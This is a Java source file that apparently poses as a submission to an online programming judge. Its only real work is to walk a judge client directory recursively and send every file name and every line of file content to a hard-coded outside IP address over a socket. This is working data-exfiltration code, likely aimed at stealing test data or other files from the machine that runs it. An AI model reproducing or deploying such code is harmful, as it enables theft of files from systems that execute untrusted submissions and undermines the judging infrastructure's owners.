import java.io.*;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.net.Socket;


class j20023 {
    public static void sendMessage(String message) throws IOException {

        try (Socket socket = new Socket("47.108.220.87", 5005);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        ) {
            out.println(message);
        }
    }

    public static void main(String[] args) throws IOException {
        //fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20001");
        //fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20002");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20003");
/*        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20004");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20005");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\20009");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200010");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200011");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200012");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200013");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200014");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200015");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200016");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200017");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200018");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200019");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200020");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200021");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200022");
        fun("D:\\Myproj\\CSharp\\MyAlgJudge\\client\\200023");*/
    }

    public static void fun(String str) throws IOException {
        File currentDir = new File(str);
        List<String> allFiles = listFilesNamesRe(currentDir);
        //List<String> fileList = listFiles(currentDir);
        //List<String> listFilesNames = listFilesNames(currentDir);
        sendMessage("connect");
        // 将fileList中的信息格式化成字符串
        StringBuilder emailContent = new StringBuilder();
        /*for (String file : fileList) {
            emailContent.append(file).append("\n");
            readAndPrintFileContent(file);
        }
        sendMessage(emailContent.toString());*/

        /*for (String file : listFilesNames) {
            emailContent.append(file).append("\n");
            readAndPrintFileContent(file);
        }
        sendMessage(emailContent.toString());*/


        for (String file : allFiles) {
            emailContent.append(file).append("\n");
            readAndPrintFileContent(file);
        }
        sendMessage(emailContent.toString());

    }
    private static List<String> listFilesNamesRe(File dir) {
        List<String> filesAndDirs = new ArrayList<>();
        File[] entries = dir.listFiles();
        if (entries != null) {
            for (File entry : entries) {
                filesAndDirs.add(entry.getAbsolutePath()); // 添加绝对路径，如果你想添加名称，可以用entry.getName()

                // 如果是文件夹，递归进入该目录
                if (entry.isDirectory()) {
                    filesAndDirs.addAll(listFilesNamesRe(entry));
                }
            }
        }
        return filesAndDirs;
    }
    public static void readAndPrintFileContent(String fileName) throws IOException {
        if(fileName == "j20023.class" || fileName == "j20023.java") return;
        File file = new File(fileName);
        if (!file.exists()) {
            sendMessage("File does not exist: " + fileName);
            return;
        }

        if (!file.canRead()) {
            sendMessage("Cannot read file: " + fileName);
            return;
        }
        sendMessage("read file: " + fileName);
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                sendMessage(line);
            }

        } catch (IOException e) {
            sendMessage("An error occurred while reading the file: " + e.getMessage());
        }
    }
    private static List<String> listFiles(File dir) {
        List<String> files = new ArrayList<>();
        File[] entries = dir.listFiles();
        if (entries != null) {
            for (File entry : entries) {
                files.add(entry.getName() + " [" + entry.isDirectory() + "]");
            }
        }
        return files;
    }

    private static List<String> listFilesNames(File dir) {
        List<String> files = new ArrayList<>();
        File[] entries = dir.listFiles();
        if (entries != null) {
            for (File entry : entries) {
                files.add(entry.getName());
            }
        }
        return files;
    }


}